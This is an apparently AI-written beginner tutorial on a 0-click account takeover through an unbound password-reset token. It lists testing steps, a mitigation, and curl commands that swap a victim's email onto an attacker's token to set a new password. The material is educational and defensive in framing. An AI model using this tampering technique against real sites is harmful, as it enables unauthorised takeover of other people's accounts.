# 0-Click Account Takeover — Insecure Password Reset Parameter

A beginner-friendly breakdown of a 0-click account takeover caused by an insecure password-reset parameter.

## Prerequisites / Tools
- Kali Linux
- Burp Suite Community (or Pro)
- Any test web app with a password-reset feature (local or lab)

## Step-by-Step Methodology

### 1. Find the Reset Flow
Request a password reset for your own test account to capture how the application sends reset links.

### 2. Observe Server Responses
Try entering a fake/non-existent email. If the app replies “No account found,” note it as **user enumeration** — but don’t stop there.

### 3. Inspect the Reset Link Format
Open the reset email and check the URL parameters. Many apps include `email=` and `token=`. Note how the token looks (length, characters).

### 4. Request a Second Reset Link
Trigger another reset for the same account to obtain a fresh token. Compare the two URLs.

### 5. Modify Only the Email Parameter
Take the new reset link and swap the `email=` value with another account you control. Keep the `token` unchanged.

### 6. Visit the Modified URL
If the page loads and allows password change for the other account, you’ve confirmed the vulnerability: the token isn’t bound to the correct email.

### 7. Validate Impact
Check whether the reset succeeds without the victim requesting it or clicking anything. This confirms a **“0-click” account takeover**.

### 8. Note Mitigation
Tokens must always be validated against the specific user/email they were issued for. The backend should ignore any tampered email parameters.

## PoC Demo (Safe + Minimal)

Here’s a simple reproducible flow for training labs or local apps.

1) Capture the Reset Link

Use Burp Suite to intercept the response OR use `curl`:

```
curl -X POST https://example.com/api/reset \
  -d "email=victim@example.com"
```

Expected output (sample):

```
{
  "reset_url": "https://example.com/reset?email=victim@example.com&token=ABC123"
}
```

2) Request Another Reset for Your Own Account

```
curl -X POST https://example.com/api/reset \
  -d "email=attacker@example.com"
```

Get your fresh link:

```
https://example.com/reset?email=attacker@example.com&token=XYZ999
```

3) Swap the Email Parameter

Modify the URL:

```
https://example.com/reset?email=victim@example.com&token=XYZ999
```

4) Open in Browser or Curl

```
curl -X POST "https://example.com/api/new-password" \
  -d "token=XYZ999&email=victim@example.com&password=NewP@ss123"
```

Expected Outcome

If vulnerable, server responds:

```
{ "status": "success", "msg": "Password updated." }
```

## Key Takeaway
If the token works for any email the attacker inserts, the backend is not verifying token-email binding — leading to full account takeover with zero user interaction.

## Learning Tips for Beginners
- Don’t ignore “small issues.” User enumeration, weird parameters, duplicate tokens — they often chain into bigger findings.
- Always test parameter tampering. `email`, `username`, `userId`, `token` — these are common weak spots.
- Practice on safe labs: TryHackMe, HackTheBox Academy, or local test apps built with Django/Node/Flask for safe experimentation.

---

If you want, I can also generate:
- A Burp Suite step-by-step PoC with screenshot placeholders,
- A report-ready write-up template,
- A Medium publish-ready version with storytelling.
